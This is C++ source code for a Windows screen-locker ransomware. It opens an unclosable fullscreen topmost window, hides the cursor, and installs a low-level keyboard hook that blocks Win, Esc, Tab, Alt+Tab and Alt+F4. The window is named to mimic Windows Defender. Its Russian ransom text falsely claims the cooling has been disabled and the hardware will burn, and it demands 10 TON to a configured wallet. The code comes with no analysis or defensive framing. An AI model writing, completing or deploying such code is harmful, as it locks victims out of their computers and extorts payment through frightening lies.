#include <windows.h>
#include <string>
#include "config.h"

static std::wstring g_text =
    L"ВАШИ КОМПЬЮТЕРЫ ЗАБЛОКИРОВАНЫ ХАКЕРСКОЙ ГРУППИРОВКОЙ SCHOOL HACK\n\n"
    L"ТЕПЛОВАЯ ЗАЩИТА ОТКЛЮЧЕНА. КУЛЕРЫ ОСТАНОВЛЕНЫ.\n"
    L"ЧЕРЕЗ 1 МИНУТУ ЖЕЛЕЗО НАЧНЁТ ГОРЕТЬ.\n\n"
    L"ПЕРЕВОДИ 10 TON НА " + WALLET + L"\n"
    L"ИЛИ КОМПЬЮТЕР ВЗЛЕТИТ К ХУЯМ.";

static HHOOK g_hook = nullptr;

LRESULT CALLBACK KbProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        auto* k = (KBDLLHOOKSTRUCT*)lParam;
        bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
        if (k->vkCode == VK_LWIN || k->vkCode == VK_RWIN ||
            k->vkCode == VK_ESCAPE || k->vkCode == VK_TAB ||
            (k->vkCode == VK_F4 && alt) ||
            (k->vkCode == VK_TAB && alt))
            return 1;
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        RECT rc;
        GetClientRect(hWnd, &rc);
        HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rc, bg);
        DeleteObject(bg);
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 0, 0));
        HFONT f = CreateFontW(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(hdc, f);
        DrawTextW(hdc, g_text.c_str(), -1, &rc, DT_CENTER | DT_VCENTER | DT_WORDBREAK);
        DeleteObject(f);
        EndPaint(hWnd, &ps);
        return 0;
    }
    case WM_CLOSE:      return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xFFF0) == SC_CLOSE) return 0;
        break;
    case WM_TIMER:
        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0,
                     SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
        return 0;
    }
    return DefWindowProcW(hWnd, msg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    ShowCursor(FALSE);
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KbProc, hInst, 0);

    WNDCLASSW wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = L"WinDefendLocker";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"WinDefendLocker", L"", WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh, nullptr, nullptr, hInst, nullptr);

    SetTimer(hWnd, 1, 100, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
